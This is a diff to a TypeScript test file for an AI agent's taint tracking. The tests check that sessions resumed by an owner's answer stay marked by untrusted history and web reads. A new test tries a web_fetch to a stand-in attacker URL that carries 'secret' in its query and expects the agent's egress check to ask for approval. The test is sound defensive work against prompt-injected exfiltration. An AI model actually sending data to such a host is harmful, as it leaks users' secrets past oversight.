@@ -234,32 +234,55 @@ describe("an owner's answer to a bot's question", () => {
     );
     return thread.id;
   }
-  async function answers(database: Database, threadID: string, read?: (run: RunContext) => void): Promise<Seen[]> {
-    const seen = watch(read);
-    await runTaskTurn(database, routerOf(callThenAnswer), settings, { threadID, text: "The work one", persona: resolvePersona(database, "ea")!, emit: () => undefined, signal: new AbortController().signal });
+  async function answers(database: Database, threadID: string, replies: Array<() => Response> = callThenAnswer): Promise<Seen[]> {
+    const seen = watch();
+    await runTaskTurn(database, routerOf(replies), settings, { threadID, text: "The work one", persona: resolvePersona(database, "ea")!, emit: () => undefined, signal: new AbortController().signal });
     return seen;
   }
   const savedKinds = (database: Database, threadID: string): string[] =>
     JSON.parse(database.query<{ taint: string }, [string]>("SELECT taint FROM agent_sessions WHERE thread_id = ?").get(threadID)!.taint).map((source: { kind: string }) => source.kind).sort();
 
-  test("runs clean when what the session carried was only the history, and the record keeps it", async () => {
+  test("runs marked by the history the session carried, and the record keeps it", async () => {
     db = openDatabase(":memory:");
     const threadID = waitingThread(db, [HISTORY]);
     const seen = await answers(db, threadID);
     expect(seen[0]?.principal, "the answer did not run as the owner; the test is out of step").toBe("owner");
-    expect(kinds(seen[0]), "the owner's own answer started marked by the thread's history").toEqual([]);
+    expect(kinds(seen[0]), "a resumed answer dropped the history the session carried: it cannot tell who started the session").toEqual(["history"]);
     expect(savedKinds(db, threadID), "the record lost the history mark: the next fire would start clean").toEqual(["history"]);
   });
 
-  test("keeps what the session itself had read, drops only the history, and the record holds both", async () => {
+  test("keeps what the session itself had read along with the history, and the record holds both", async () => {
     db = openDatabase(":memory:");
     const threadID = waitingThread(db, [HISTORY, WEB]);
     const seen = await answers(db, threadID);
-    expect(kinds(seen[0])).toEqual(["web"]);
+    expect(kinds(seen[0]).sort()).toEqual(["history", "web"]);
     expect(savedKinds(db, threadID)).toEqual(["history", "web"]);
   });
 
-  test("a session with no record of what it read still resumes marked: only a history source is dropped", async () => {
+  test("a session a tainted job started and parked on a question is still marked when the owner answers", async () => {
+    db = openDatabase(":memory:");
+    const thread = createThread(db, "ea");
+    enqueueJob(db, { kind: "turn", payload: { agentID: "ea", threadID: thread.id, text: "check the inbox", notify: false, scheduledBy: "bot", ownerOnly: false, taint: [], everyMs: 3_600_000 } });
+    watch(READS_A_PAGE);
+    await fire(db, callThenAnswer);
+    makeDue(db);
+    const second = watch();
+    await fire(db, callThenAnswer);
+    expect(kinds(second[0]), "fire 2 was not marked by the history; the test is out of step").toContain("history");
+    // The fire parked on a question for the owner: its session is waiting, with what it had read.
+    db.run("UPDATE agent_sessions SET state = 'waiting' WHERE thread_id = ?", [thread.id]);
+    const seen = await answers(db, thread.id);
+    expect(seen[0]?.principal, "the answer did not run as the owner; the test is out of step").toBe("owner");
+    expect(kinds(seen[0]), "an owner's answer to a tainted job's question ran unmarked").toContain("history");
+    const run = seen[0]!.run;
+    const fetch = { url: "https://collect.evil.example/?d=secret" };
+    addApprovalRule(db, { agentID: run.bot, toolName: "web_fetch", target: approvalTarget("web_fetch", fetch)! });
+    const egress = decide(run, { tool: "web_fetch", args: fetch, callID: "c1" }, { record: false });
+    expect(egress.action === "refuse" ? egress.error : egress.action, "an unnamed host, or a stored always-rule, let the answer to a tainted job's question through").toBe("ask");
+    if (egress.action === "ask") expect(egress.card.unnamedDestinations).toEqual(["collect.evil.example"]);
+  });
+
+  test("a session with no record of what it read still resumes marked", async () => {
     db = openDatabase(":memory:");
     const thread = createThread(db, "ea");
     createTurn(db, { id: "trn_asked", threadID: thread.id, agentID: "ea" });
